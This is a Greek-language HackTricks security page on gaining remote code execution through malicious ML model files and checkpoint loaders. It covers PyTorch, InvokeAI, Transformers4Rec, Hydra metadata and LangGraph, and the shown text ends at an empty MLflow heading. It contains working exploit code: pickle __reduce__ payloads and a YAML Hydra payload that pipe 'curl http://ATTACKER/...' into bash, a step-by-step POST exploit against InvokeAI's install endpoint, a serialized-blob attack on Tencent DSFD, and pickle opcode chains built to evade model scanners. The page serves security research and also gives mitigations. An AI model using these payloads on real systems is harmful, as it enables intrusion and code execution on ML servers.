# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Φόρτωση μοντέλων για RCE

Τα μοντέλα Machine Learning συνήθως διαμοιράζονται σε διάφορες μορφές, όπως ONNX, TensorFlow, PyTorch κ.λπ. Οι προγραμματιστές μπορούν να τα φορτώσουν στα μηχανήματά τους ή σε συστήματα παραγωγής για να τα χρησιμοποιήσουν. Συνήθως, τα μοντέλα δεν θα πρέπει να περιέχουν κακόβουλο κώδικα, αλλά υπάρχουν περιπτώσεις όπου το μοντέλο μπορεί να χρησιμοποιηθεί για την εκτέλεση αυθαίρετου κώδικα στο σύστημα, είτε ως επιδιωκόμενη λειτουργία είτε λόγω ευπάθειας στη βιβλιοθήκη φόρτωσης μοντέλων.

Ο παρακάτω πίνακας παραθέτει ενδεικτικές ευπάθειες αυτής της κατηγορίας:

| **Framework / Εργαλείο**        | **Ευπάθεια (CVE, αν υπάρχει)**                                                    | **Διάνυσμα RCE**                                                                                                                           | **Αναφορές**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Μη ασφαλής αποσειριοποίηση στο* `torch.load` **(CVE-2025-32434)**                                                              | Κακόβουλο pickle σε checkpoint μοντέλου οδηγεί σε εκτέλεση κώδικα (παρακάμπτοντας την προστασία `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + λήψη κακόβουλου μοντέλου προκαλεί εκτέλεση κώδικα· RCE μέσω Java deserialization στο management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Μη ασφαλής αποσειριοποίηση checkpoint μέσω `torch.load` **(CVE-2025-23298)**                                           | Μη έμπιστο checkpoint ενεργοποιεί pickle reducer κατά την εκτέλεση της `load_model_trainer_states_from_checkpoint` → εκτέλεση κώδικα στον ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + μη ασφαλές hook επέκτασης MessagePack **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Το ελεγχόμενο από τον χρήστη κλειδί `filter` εισάγει σύνταξη SQL/JSON-path, το `UNION SELECT` κατασκευάζει μια ψεύτικη γραμμή checkpoint και, στη συνέχεια, η αποσειριοποίηση του `msgpack` εισάγει και καλεί κώδικα Python που επιλέγει ο εισβολέας | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (μη ασφαλές YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Η φόρτωση μοντέλου από YAML χρησιμοποιεί `yaml.unsafe_load` (εκτέλεση κώδικα) <br> Η φόρτωση μοντέλου με επίπεδο **Lambda** εκτελεί αυθαίρετο κώδικα Python          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (ανάλυση TFLite)                                                                                          | Ένα ειδικά διαμορφωμένο μοντέλο `.tflite` προκαλεί υπερχείλιση ακέραιου → αλλοίωση heap (πιθανό RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Η φόρτωση μοντέλου μέσω `joblib.load` εκτελεί pickle με payload `__reduce__` του εισβολέα                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (μη ασφαλές `np.load`) *αμφισβητούμενο*                                                                              | Η προεπιλεγμένη συμπεριφορά του `numpy.load` επέτρεπε πίνακες αντικειμένων με pickle – κακόβουλο `.npy/.npz` προκαλεί εκτέλεση κώδικα                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (directory traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Η διαδρομή external-weights του μοντέλου ONNX μπορεί να διαφύγει από τον κατάλογο (ανάγνωση αυθαίρετων αρχείων) <br> Ένα κακόβουλο αρχείο tar μοντέλου ONNX μπορεί να αντικαταστήσει αυθαίρετα αρχεία (οδηγώντας σε RCE) | |
| ONNX Runtime (κίνδυνος σχεδιασμού)  | *(Χωρίς CVE)* custom ops / control flow του ONNX                                                                                    | Μοντέλο με custom operator απαιτεί τη φόρτωση εγγενούς κώδικα του εισβολέα· σύνθετα γραφήματα μοντέλων καταχρώνται τη λογική για να εκτελέσουν μη επιδιωκόμενους υπολογισμούς   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Η χρήση του model-load API με ενεργοποιημένο το `--model-control` επιτρέπει σχετική διαδρομή traversal για εγγραφή αρχείων (π.χ., αντικατάσταση του `.bashrc` για RCE)    | |
| **GGML (μορφή GGUF)**      | **CVE-2024-25664 … 25668** (πολλαπλές υπερχειλίσεις heap)                                                                         | Ένα κακοσχηματισμένο αρχείο μοντέλου GGUF προκαλεί υπερχειλίσεις heap buffer στον parser, επιτρέποντας την εκτέλεση αυθαίρετου κώδικα στο σύστημα του θύματος                     | |
| **Keras (παλαιότερες μορφές)**   | *(Χωρίς νέο CVE)* Μοντέλο Keras H5 παλαιού τύπου                                                                                         | Ο κώδικας επιπέδου Lambda σε κακόβουλο μοντέλο HDF5 (`.h5`) εξακολουθεί να εκτελείται κατά τη φόρτωση (το safe_mode του Keras δεν καλύπτει την παλιά μορφή – «downgrade attack») | |
| **Άλλα** (γενικά)        | *Ελάττωμα σχεδιασμού* – σειριοποίηση Pickle                                                                                         | Πολλά εργαλεία ML (π.χ. μορφές μοντέλων που βασίζονται σε pickle, Python `pickle.load`) εκτελούν αυθαίρετο κώδικα ενσωματωμένο σε αρχεία μοντέλων, εκτός αν ληφθούν μέτρα προστασίας | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Μη έμπιστα μεταδεδομένα που περνούν στο `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Μεταδεδομένα/ρυθμίσεις μοντέλου που ελέγχει ο εισβολέας ορίζουν το `_target_` σε αυθαίρετη callable (π.χ., `builtins.exec`) → εκτελείται κατά τη φόρτωση, ακόμη και με «ασφαλείς» μορφές (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Επιπλέον, υπάρχουν μοντέλα που βασίζονται σε Python pickle, όπως αυτά που χρησιμοποιεί το [PyTorch](https://github.com/pytorch/pytorch/security), τα οποία μπορούν να χρησιμοποιηθούν για την εκτέλεση αυθαίρετου κώδικα στο σύστημα, αν δεν φορτωθούν με `weights_only=True`. Επομένως, κάθε μοντέλο που βασίζεται σε pickle μπορεί να είναι ιδιαίτερα ευάλωτο σε αυτόν τον τύπο επιθέσεων, ακόμη κι αν δεν περιλαμβάνεται στον παραπάνω πίνακα.

### Παράκαμψη στατικών ελέγχων σε checkpoints που βασίζονται σε pickle

Μια διαδρομή φόρτωσης μοντέλου που καλεί μη περιορισμένο `pickle.load()`, `joblib.load()` ή `torch.load(..., weights_only=False)` αποτελεί σημείο εκτέλεσης, όχι απλώς parser.<sup>[[22]](#references)</sup> Στο PyTorch 2.6, το `torch.load()` έχει ως προεπιλογή `weights_only=True` όταν δεν παρέχεται προσαρμοσμένο pickle module· τα παρακάτω παραδείγματα απαιτούν μη περιορισμένο loader ή εφαρμογή που απενεργοποιεί αυτή την προστασία για να φορτωθεί ένα μη υποστηριζόμενο αντικείμενο.<sup>[[4]](#references)</sup> Ένα καθαρό αποτέλεσμα στατικού ελέγχου δεν αλλάζει αυτό το όριο.<sup>[[21]](#references)</sup>

Δείτε την ενότητα [Python pickle deserialization](../pentesting-web/deserialization/#pickle) για τη βασική τεχνική `__reduce__` και τη [λίστα επιτρεπόμενων imports του Fickling για ML](../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md#ml-pickle-import-allowlisting-for-aiml-models-fickling) για ελέγχους imports κατά τον χρόνο εκτέλεσης.

#### Καταχώριση callable και έπειτα επίλυσή της με `EXT2`

Ένα pickle μπορεί να καλέσει το `copyreg.add_extension` μέσω του `REDUCE`, καταχωρίζοντας ένα ζεύγος module/name με έναν αριθμητικό κωδικό επέκτασης που επιλέγει ο εισβολέας. Ένα μεταγενέστερο `EXT2` επιλύει αυτόν τον κωδικό σε callable, την οποία μπορεί να καλέσει ένα ακόμη `REDUCE`. Επομένως, η κρίσιμη callable δεν είναι τελεστέος ενός opcode `GLOBAL` ή `STACK_GLOBAL`. Η Binarly το έδειξε με το `multiprocessing.util.spawnv_passfds`· τέσσερις από τους πέντε αξιολογημένους scanners δεν το εντόπισαν, ενώ το SaferPickle το ανίχνευσε. Η μεταβολή του registry και η επίλυση του `EXT2` πραγματοποιούνται μέσα στην ίδια λειτουργία unpickling.<sup>[[21]](#references)[[22]](#references)</sup>

```text
GLOBAL       'copyreg add_extension'
BINUNICODE   'multiprocessing.util'
BINUNICODE   'spawnv_passfds'
BININT2      31337
TUPLE3
REDUCE       # register the extension
POP
EXT2         31337  # resolve the callable
# Push its arguments, then REDUCE to call it
```

Αυτό είναι ένα opcode περίγραμμα, όχι ένα πλήρες checkpoint: ο εξωτερικός loader πρέπει να αποδέχεται το περιβάλλον pickle stream. Ένας scanner που αναζητά μόνο επικίνδυνες κλήσεις στα ορίσματα του `GLOBAL` δεν εντοπίζει την επόμενη αναζήτηση· ένας scanner χωρίς υποστήριξη `EXT2` ενδέχεται να αποτύχει πριν εκδώσει verdict. Ένα αυστηρό allowlist μπορεί και πάλι να απορρίψει το ίδιο το `copyreg.add_extension`.<sup>[[21]](#references)</sup>

#### Απόκρυψη κατασκευασμένων τύπων code-object πίσω από συνηθισμένες συναρτήσεις

Μια άλλη αλυσίδα pickle μπορεί να λάβει το `FunctionType` από το `type(copy.copy)` και το `CodeType` από το `type(copy.copy.__code__)`, έπειτα να κατασκευάσει ένα code object από παρεχόμενο bytecode, να το περιβάλει ως συνάρτηση και να το καλέσει. Η δημοσιευμένη παραλλαγή λαμβάνει το `__code__` μέσω του `operator.methodcaller('__getattribute__', '__code__')`, οπότε το pickle δεν χρειάζεται να εισαγάγει κανέναν από τους δύο constructors με το όνομά του. Η διάταξη των πεδίων και το bytecode του `CodeType(...)` εξαρτώνται από την έκδοση του CPython· ένα payload που κατασκευάστηκε για διαφορετικό interpreter μπορεί να αποτύχει πριν από την εκτέλεσή του. Το SaferPickle εξακολουθούσε να επισημαίνει το επιδεικνυόμενο δείγμα, αλλά το υποβάθμισε σε `suspicious`· οι άλλοι τέσσερις αξιολογημένοι scanners δεν το εντόπισαν.<sup>[[21]](#references)[[22]](#references)</sup>

```python
from copy import copy
from operator import methodcaller
function_type = type(copy)
code_type = type(methodcaller('__getattribute__', '__code__')(copy))
# REDUCE can construct code_type(...) and function_type(code, {})
```

#### Ενεργοποίηση δεύτερης φόρτωσης μοντέλου από όρισμα pickle

Ένα εξωτερικό pickle μπορεί να καλέσει τη `torch.storage._load_from_bytes` με όρισμά της ένα σειριοποιημένο μοντέλο που έχει δώσει ο επιτιθέμενος. Αυτή η συνάρτηση καλεί τη `torch.load(io.BytesIO(b), weights_only=False)`, οπότε το ένθετο μοντέλο αποσειριοποιείται χωρίς τον περιορισμό `weights_only`, παρότι σε έναν σαρωτή opcode ανώτατου επιπέδου φαίνεται ως bytes που δίνονται σε μία κλήση συνάρτησης. Η εξωτερική φόρτωση πρέπει και πάλι να επιτρέπει αυτήν την κλήση· το `weights_only=True` δεν κάνει αυτόματα το εξωτερικό pickle αποδεκτό. Οι σαρωτές που δεν εξετάζουν αναδρομικά τα ένθετα bytes μπορεί να παραβλέψουν την εσωτερική αλυσίδα `GLOBAL`/`REDUCE`.<sup>[[21]](#references)[[23]](#references)</sup>

#### Επίλυση ονόματος παλαιού module pickle κατά τη φόρτωση

Για πρωτόκολλα pickle μικρότερα από 3, η προεπιλεγμένη ρύθμιση `fix_imports=True` της Python αντιστοιχίζει μια αναφορά `GLOBAL` στο `commands.run` με το `subprocess.run` μέσω του `_compat_pickle.IMPORT_MAPPING`. Έτσι, ένας σαρωτής που συγκρίνει το κυριολεκτικό όνομα module με μια λίστα αποκλεισμού για το `subprocess` μπορεί να παραβλέψει την callable που χρησιμοποιείται κατά την εκτέλεση. Αυτό απαιτεί έναν loader που διατηρεί την αντιστοίχιση συμβατότητας και αποδέχεται τα ορίσματα κλήσης που προκύπτουν.<sup>[[21]](#references)[[24]](#references)[[25]](#references)</sup>

#### Παράκαμψη σαρωτή αποκλειστικά για ZIP με checkpoint που δεν είναι ZIP

Η επιλογή μορφής μπορεί να αποτύχει ανεξάρτητα από την επιθεώρηση opcode: η Binarly διαπίστωσε ότι το ModelScan 0.8.8 δρομολογούσε αρχεία `.bin`, `.pt`, `.pth` και `.ckpt` σε έναν σαρωτή PyTorch ειδικό για ZIP και παρέλειπε ένα μη-ZIP pickle stream αντί να επιστρέψει στον σαρωτή απλού pickle. Τεκμηρίωσε επίσης μια διάταξη μοντέλου παλαιού τύπου TAR, την οποία δέχεται η `torch.load()`, αλλά δεν επιθεωρούσαν τα ModelScan και JFrog. Πρόκειται για κενά που αφορούν συγκεκριμένες εκδόσεις σαρωτών, όχι για ιδιότητες κάθε σαρωτή μοντέλων.<sup>[[21]](#references)</sup>

#### Εκτέλεση πριν ο static parser φτάσει σε κακοσχηματισμένη ουρά

Ένας σαρωτής που διατρέχει πλήρως ένα pickle με `pickletools.genops()` μπορεί να προκαλέσει εξαίρεση σε truncated opcode που ακολουθεί ένα έγκυρο `REDUCE`. Ο unrestricted unpickler έχει ήδη καλέσει τη συνάρτηση πριν συναντήσει αυτήν την ουρά, ακόμη κι αν η συνολική φόρτωση προκαλέσει αργότερα εξαίρεση. Το αναφερόμενο δείγμα τοποθετούσε ένα truncated `BINUNICODE` αμέσως μετά το `REDUCE` που εκτελούσε κώδικα, με αποτέλεσμα να αποτύχει το `pickletools.genops()` ενώ είχε ήδη συμβεί η προηγούμενη παρενέργεια εγγραφής αρχείου. Αυτό παρακάμπτει έναν σαρωτή μόνο αν αυτός θεωρήσει το σφάλμα ανάλυσης ακίνδυνο ή παραλείψει το αρχείο. Είναι χρήσιμο μόνο όταν η παρενέργεια έχει σημασία χωρίς να επιστραφεί επιτυχώς ένα μοντέλο· ένας στόχος που απαιτεί να ολοκληρωθεί η φόρτωση μπορεί να απορρίψει το artifact.<sup>[[21]](#references)</sup>

### Μεταδεδομένα Hydra → RCE (λειτουργεί ακόμη και με safetensors)

Η `hydra.utils.instantiate()` εισάγει και καλεί οποιοδήποτε dotted `_target_` σε ένα αντικείμενο διαμόρφωσης/μεταδεδομένων. Όταν βιβλιοθήκες όπως το Hugging Face Transformers τροφοδοτούν **μη έμπιστα μεταδεδομένα μοντέλου** στη `instantiate()`, ένας επιτιθέμενος μπορεί να δώσει μια callable και ορίσματα που εκτελούνται αμέσως κατά τη φόρτωση του μοντέλου (δεν απαιτείται pickle).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Παράδειγμα payload (λειτουργεί στο `model_config.yaml` του `.nemo`, στο `config.json` του repo ή στο `__metadata__` μέσα σε `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Βασικά σημεία:
- Ενεργοποιείται πριν από την αρχικοποίηση του μοντέλου στα `restore_from/from_pretrained` του NeMo, στους coders του uni2TS HuggingFace και στους loaders του FlexTok.
- Η block-list συμβολοσειρών του Hydra μπορεί να παρακαμφθεί μέσω εναλλακτικών διαδρομών εισαγωγής (π.χ. `enum.bltns.eval`) ή ονομάτων που επιλύονται από την εφαρμογή (π.χ. `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- Το FlexTok αναλύει επίσης μεταδεδομένα σε μορφή συμβολοσειράς με το `ast.literal_eval`, επιτρέποντας DoS (υπερβολική κατανάλωση CPU/μνήμης) πριν από την κλήση του Hydra.

### 🆕  InvokeAI RCE μέσω `torch.load` (CVE-2024-12029)

Το `InvokeAI` είναι ένα δημοφιλές open-source web interface για το Stable-Diffusion. Οι εκδόσεις **5.3.1 – 5.4.2** εκθέτουν το REST endpoint `/api/v2/models/install`, το οποίο επιτρέπει στους χρήστες να κατεβάζουν και να φορτώνουν μοντέλα από αυθαίρετα URL.<sup>[[1]](#references)</sup>

Εσωτερικά, το endpoint τελικά καλεί:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Όταν το παρεχόμενο αρχείο είναι ένα **PyTorch checkpoint (`*.ckpt`)**, η `torch.load` εκτελεί **αποσειριοποίηση pickle**. Επειδή το περιεχόμενο προέρχεται απευθείας από URL που ελέγχει ο χρήστης, ένας εισβολέας μπορεί να ενσωματώσει ένα κακόβουλο αντικείμενο με προσαρμοσμένη μέθοδο `__reduce__` μέσα στο checkpoint· η μέθοδος εκτελείται **κατά την αποσειριοποίηση**, οδηγώντας σε **απομακρυσμένη εκτέλεση κώδικα (RCE)** στον server του InvokeAI.

Στην ευπάθεια αποδόθηκε το **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Περιήγηση στην εκμετάλλευση

1. Δημιουργήστε ένα κακόβουλο checkpoint:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Φιλοξενήστε το `payload.ckpt` σε έναν HTTP server που ελέγχετε (π.χ. `http://ATTACKER/payload.ckpt`).
3. Ενεργοποιήστε το ευάλωτο endpoint (δεν απαιτείται authentication):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Όταν το InvokeAI κατεβάζει το αρχείο, καλεί τη `torch.load()` → εκτελείται το gadget `os.system` και ο attacker αποκτά εκτέλεση κώδικα στο πλαίσιο της διεργασίας InvokeAI.

Έτοιμο exploit: το module `exploit/linux/http/invokeai_rce_cve_2024_12029` του **Metasploit** αυτοματοποιεί όλη τη διαδικασία.<sup>[[3]](#references)</sup>

#### Προϋποθέσεις

•  InvokeAI 5.3.1-5.4.2 (η προεπιλεγμένη τιμή της σημαίας scan είναι **false**)
•  Ο attacker έχει πρόσβαση στο `/api/v2/models/install`
•  Η διεργασία έχει δικαιώματα εκτέλεσης εντολών shell

#### Μετριασμός κινδύνου

* Αναβαθμίστε σε **InvokeAI ≥ 5.4.3** – η ενημέρωση κώδικα ορίζει από προεπιλογή το `scan=True` και εκτελεί έλεγχο για malware πριν από την αποσειριοποίηση.<sup>[[2]](#references)</sup>
* Όταν φορτώνετε checkpoints μέσω προγραμματισμού, χρησιμοποιήστε `torch.load(file, weights_only=True)` ή τη νέα βοηθητική συνάρτηση [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Εφαρμόστε λίστες επιτρεπόμενων πηγών / υπογραφές για τα μοντέλα και εκτελέστε την υπηρεσία με τα ελάχιστα απαραίτητα δικαιώματα.

> ⚠️ Να θυμάστε ότι κάθε μορφή βασισμένη σε Python pickle (συμπεριλαμβανομένων πολλών αρχείων `.pt`, `.pkl`, `.ckpt`, `.pth`) είναι εγγενώς μη ασφαλής για αποσειριοποίηση από μη έμπιστες πηγές.

---

Παράδειγμα ad-hoc μετριασμού κινδύνου, αν πρέπει να συνεχίσετε να εκτελείτε παλαιότερες εκδόσεις του InvokeAI πίσω από reverse proxy:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE μέσω unsafe `torch.load` (CVE-2025-23298)

Το Transformers4Rec της NVIDIA (μέρος του Merlin) εξέθετε έναν μη ασφαλή loader checkpoint που καλούσε απευθείας τη `torch.load()` σε διαδρομές που παρείχε ο χρήστης. Επειδή η `torch.load` βασίζεται στην Python `pickle`, ένα checkpoint υπό τον έλεγχο του επιτιθέμενου μπορεί να εκτελέσει αυθαίρετο κώδικα μέσω ενός reducer κατά την αποσειριοποίηση.<sup>[[5]](#references)</sup>

Ευάλωτη διαδρομή (πριν από τη διόρθωση): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Γιατί αυτό οδηγεί σε RCE: Στην Python `pickle`, ένα αντικείμενο μπορεί να ορίσει έναν reducer (`__reduce__`/`__setstate__`) που επιστρέφει ένα callable και ορίσματα. Το callable εκτελείται κατά την αποσειριοποίηση. Αν ένα τέτοιο αντικείμενο υπάρχει σε ένα checkpoint, εκτελείται πριν χρησιμοποιηθούν οποιαδήποτε βάρη.

Ελάχιστο παράδειγμα κακόβουλου checkpoint:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Διανύσματα παράδοσης και ακτίνα επίδρασης:
- Trojanized checkpoints/models που κοινοποιούνται μέσω repos, buckets ή artifact registries
- Αυτοματοποιημένα pipelines resume/deploy που φορτώνουν αυτόματα checkpoints
- Η εκτέλεση γίνεται μέσα σε workers εκπαίδευσης/συμπερασμού, συχνά με αυξημένα προνόμια (π.χ., ως root σε containers)

Διόρθωση: Το commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) αντικατέστησε την άμεση χρήση του `torch.load()` με έναν περιορισμένο deserializer, ο οποίος χρησιμοποιεί allow-list και υλοποιείται στο `transformers4rec/utils/serialization.py`. Ο νέος loader επικυρώνει τους τύπους και τα πεδία και αποτρέπει την κλήση αυθαίρετων callables κατά τη φόρτωση.<sup>[[7]](#references)</sup>

Αμυντικές οδηγίες ειδικά για PyTorch checkpoints:
- Μην κάνετε unpickle μη έμπιστων δεδομένων. Προτιμήστε μη εκτελέσιμες μορφές όπως [Safetensors](https://huggingface.co/docs/safetensors/index) ή ONNX, όπου είναι δυνατό.
- Αν πρέπει να χρησιμοποιήσετε serialization του PyTorch, βεβαιωθείτε ότι είναι ενεργό το `weights_only=True` (υποστηρίζεται σε νεότερες εκδόσεις του PyTorch) ή χρησιμοποιήστε custom unpickler με allow-list, παρόμοιο με το patch του Transformers4Rec.<sup>[[4]](#references)</sup>
- Εφαρμόστε ελέγχους προέλευσης/υπογραφών μοντέλων και εκτελέστε το deserialization σε sandbox (seccomp/AppArmor· χρήστης χωρίς προνόμια root· περιορισμένο FS και χωρίς εξερχόμενη κίνηση δικτύου).
- Παρακολουθείτε για απρόσμενες child processes από ML services κατά τη φόρτωση checkpoint· ανιχνεύετε τη χρήση των `torch.load()`/`pickle`.

Αναφορές σε POC και ευάλωτη έκδοση/patch:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Ευάλωτος loader πριν από το patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC κακόβουλου checkpoint: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader μετά το patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Παράδειγμα – δημιουργία κακόβουλου μοντέλου PyTorch

- Δημιουργήστε το μοντέλο:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Φορτώστε το μοντέλο:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Αποσειριοποίηση Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Το FaceDetection-DSFD της Tencent εκθέτει ένα endpoint `resnet` που αποσειριοποιεί δεδομένα ελεγχόμενα από τον χρήστη. Το ZDI επιβεβαίωσε ότι ένας απομακρυσμένος attacker μπορεί να εξαναγκάσει ένα θύμα να φορτώσει μια κακόβουλη σελίδα/αρχείο, να το κάνει να στείλει ένα ειδικά κατασκευασμένο serialized blob σε αυτό το endpoint και να ενεργοποιήσει την αποσειριοποίηση ως `root`, οδηγώντας σε πλήρη παραβίαση.

Η ροή του exploit ακολουθεί το τυπικό μοτίβο κατάχρησης του pickle:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Κάθε gadget που είναι προσβάσιμο κατά την αποσειριοποίηση (constructors, `__setstate__`, callbacks του framework κ.λπ.) μπορεί να οπλοποιηθεί με τον ίδιο τρόπο, ανεξάρτητα από το αν η μεταφορά έγινε μέσω HTTP, WebSocket ή αρχείου που αποθηκεύτηκε σε κατάλογο υπό παρακολούθηση.



### LangGraph checkpointer SQLi → MessagePack RCE

Αυτή η αλυσίδα επίθεσης είναι ενδιαφέρουσα, επειδή ο επιτιθέμενος **δεν χρειάζεται να ανεβάσει κακόβουλο αρχείο μοντέλου**. Αντίθετα, η εφαρμογή εκθέτει ένα **API persistence για AI-agent** (`get_state_history(..., filter=...)`) και τα δεδομένα εισόδου του χρήστη φτάνουν στο query builder του checkpointer.

#### 1. Δομικό SQLi στα metadata filters

Ένα ευάλωτο μοτίβο SQLite έμοιαζε ως εξής:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Η τιμή δεσμεύεται αργότερα, αλλά το `query_key` συνενώνεται στη **συμβολοσειρά JSON path**, επομένως ένα `'` μέσα στο dictionary key ξεφεύγει από το `'$.{query_key}'` και εισάγει SQL. Το ίδιο ισχύει για **JSON paths, identifiers, operators, `LIMIT` και πεδία TTL**: τα placeholders προστατεύουν μόνο τις τιμές, όχι τη δομική σύνταξη του query.

#### 2. Το `UNION SELECT` μπορεί να στοχεύσει downstream sinks, όχι μόνο να υποκλέψει δεδομένα

Το query επιστρέφει τα `type` και serialized bytes του `checkpoint`, τα οποία στη συνέχεια καταναλώνονται ως:

```python
self.serde.loads_typed((type, checkpoint))
```

Αυτό σημαίνει ότι ένα SQLi στη ρήτρα `WHERE` μπορεί να εισαγάγει μια **ψεύτικη γραμμή αποτελέσματος**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Αν μεταγενέστερος κώδικας αναλύει, αποσειριοποιεί, γράφει ή εκτελεί κάποια επιλεγμένη στήλη, αντιστοιχίστε αυτές τις στήλες με τα sinks τους. Σε αυτήν την περίπτωση, η πλαστή γραμμή μετατρέπει το SQLi σε **αποσειριοποίηση ελεγχόμενη από τον επιτιθέμενο**.

#### 3. Τα μη ασφαλή hooks επέκτασης του MessagePack ισοδυναμούν με gadgets κώδικα

Η διαδρομή `msgpack` του LangGraph χρησιμοποιούσε ένα προσαρμοσμένο hook επέκτασης που αποσυσκεύαζε ένα εμφωλευμένο tuple και εκτελούσε:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Έτσι, ένα αντικείμενο επέκτασης MessagePack που κωδικοποιεί κάτι ισοδύναμο με `("os", "system", "id > /tmp/pwned")` εισάγει το `os`, επιλύει το `system` και εκτελεί την εντολή. Κατά την εξέταση AI frameworks, ελέγξτε τους **custom MessagePack/JSON/pickle revivers** για δυναμικές εισαγωγές, reflection ή αυθαίρετη κλήση callable.

#### 4. Πρακτικό μοτίβο ελέγχου για agent frameworks

Εξετάστε κάθε είσοδο που ελέγχεται από τον χρήστη και φτάνει σε:
- API ιστορικού κατάστασης / μνήμης / επαναλήψεων / καταχώρισης checkpoints
- structured filter builders που δημιουργούν τμήματα ερωτημάτων SQL ή Redis
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- διαδρομές ανάκαμψης που εμπιστεύονται τις γραμμές που επιστρέφει το persistence layer

Αυτή η συγκεκριμένη αλυσίδα επηρέαζε self-hosted αναπτύξεις του LangGraph που χρησιμοποιούσαν checkpointers **SQLite** ή **Redis**, όταν μη έμπιστοι χρήστες μπορούσαν να ελέγχουν το `filter`. Οι patched εκδόσεις που αναφέρονταν στη γνωστοποίηση ήταν οι `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` και `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### Αντικατάσταση artifact MLflow PyFunc για pickle RCE

